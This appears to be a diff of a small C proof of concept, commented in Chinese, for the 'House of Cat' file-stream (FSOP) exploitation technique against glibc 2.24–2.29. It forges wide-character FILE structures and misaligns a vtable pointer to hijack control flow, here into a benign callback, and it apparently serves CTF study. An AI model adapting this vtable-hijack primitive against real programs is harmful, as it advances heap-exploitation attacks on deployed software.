@@ -1,17 +1,19 @@
 #define _GNU_SOURCE
 /*
- * House of Cat 最终触发点微型 PoC：glibc 2.24～2.29，x86-64。
+ * House of Cat 最终触发点的微型 PoC，适用于 glibc 2.24～2.29，x86-64。
  *
- * 模拟漏洞：可以覆盖 FILE 的 primary vtable、_wide_data 与 fake wide vtable。
+ * 漏洞模拟：假设攻击者已经能覆盖 FILE 的 primary vtable、_wide_data
+ * 以及伪造的 wide vtable。
  * 核心流程：
  *   __overflow -> 合法偏移后的 primary overflow 槽
  *              -> 进入宽字符定位函数 _IO_wfile_seekoff
  *              -> 进入宽字符读模式切换函数 _IO_switch_to_wget_mode
- *              -> 未经白名单的 fake wide-vtable overflow
- * 成功判据：cat_callback 被调用一次，参数中的 FILE 指针就是伪造对象。
+ *              -> 未经白名单校验的伪造 wide-vtable overflow
+ * 成功判据：cat_callback 被调用一次，且传入的 FILE 指针正是我们伪造的对象。
  *
- * 这份程序只隔离验证 FSOP 最终触发点，不模拟 largebin 覆盖 stderr、malloc assert
- * 或最终 system/ORW。所有字段偏移均应在题目附件 libc 的 Build ID 上复核。
+ * 这份程序只单独验证 FSOP 的最终触发点，不去模拟用 largebin 覆盖 stderr、
+ * 触发 malloc assert，或者最终的 system/ORW 步骤。所有字段偏移都应该按
+ * 题目附件 libc 的实际 Build ID 重新核对。
  */
 
 #include <assert.h>
@@ -29,11 +31,12 @@ static FILE *callback_file;
 
 static int cat_callback(FILE *fp, int wide_eof)
 {
+    (void)wide_eof; // 回调签名固定，本 PoC 只关心 fp。
     callback_count++;
     callback_file = fp;
 
-    /* 返回 WEOF，让 _IO_switch_to_wget_mode 立即返回 EOF；这样只验证
-       callback 最终触发点，不继续执行 _IO_wfile_seekoff 的 buffer/codecvt 路径。 */
+    /* 返回 WEOF 让 _IO_switch_to_wget_mode 立即返回 EOF，这样就只验证
+       callback 这一个最终触发点，不必再走 _IO_wfile_seekoff 的 buffer/codecvt 路径。 */
     return WEOF;
 }
 
@@ -55,14 +58,14 @@ int main(void)
     void *saved_wide_data = *wide_data_slot;
     int saved_mode = fp->_mode;
 
-    /* 用 qword 数组表达 _IO_wide_data，让 CTF 选手直接把索引对应到
-       payload offset；本分支的 _wide_vtable 固定在 +0x130。 */
+    /* 用 qword 数组来表示 _IO_wide_data，方便 CTF 选手直接把数组索引
+       对应到 payload 里的字节偏移；这个分支的 _wide_vtable 固定在 +0x130。 */
     uint64_t fake_wide_data[0x150 / 8] __attribute__((aligned(0x10)));
     uint64_t fake_wide_vtable[0xa8 / 8] __attribute__((aligned(0x10)));
     memset(fake_wide_data, 0, sizeof(fake_wide_data));
     memset(fake_wide_vtable, 0, sizeof(fake_wide_vtable));
 
-    /* 2.24～2.29 保留 legacy codecvt 函数表，_wide_vtable 位于 +0x130。 */
+    /* 2.24～2.29 这个区间还保留着旧版 codecvt 函数表，所以 _wide_vtable 位于 +0x130。 */
     const size_t wide_vtable_offset = 0x130;
 
     fake_wide_data[0x18 / 8] = 0; /* 将宽字符写缓冲区起点字段 _IO_write_base 置零。 */
@@ -73,16 +76,17 @@ int main(void)
     *wide_data_slot = fake_wide_data;
     fp->_mode = 1;
 
-    /* primary overflow=0x18，seekoff=0x48；+0x30 后仍位于合法
-       __libc_IO_vtables section，因此 __overflow 内的校验不会终止进程。 */
+    /* overflow 槽偏移是 0x18，seekoff 槽偏移是 0x48，两者相差 0x30；
+       偏移后的地址仍然落在合法的 __libc_IO_vtables section 内，所以
+       __overflow 内部的校验不会因此终止进程。 */
     *primary_vtable = (char *)wfile_jumps + (0x48 - 0x18);
 
-    int result = call_overflow(fp, EOF);
+    call_overflow(fp, EOF);
 
     assert(callback_count == 1);
     assert(callback_file == fp);
 
-    /* 恢复真实 FILE 后再 fclose，避免 libc 用 fake wide_data 做清理。 */
+    /* 恢复真实的 FILE 字段后再 fclose，避免 libc 拿伪造的 wide_data 去做清理。 */
     *primary_vtable = saved_primary_vtable;
     *wide_data_slot = saved_wide_data;
     fp->_mode = saved_mode;
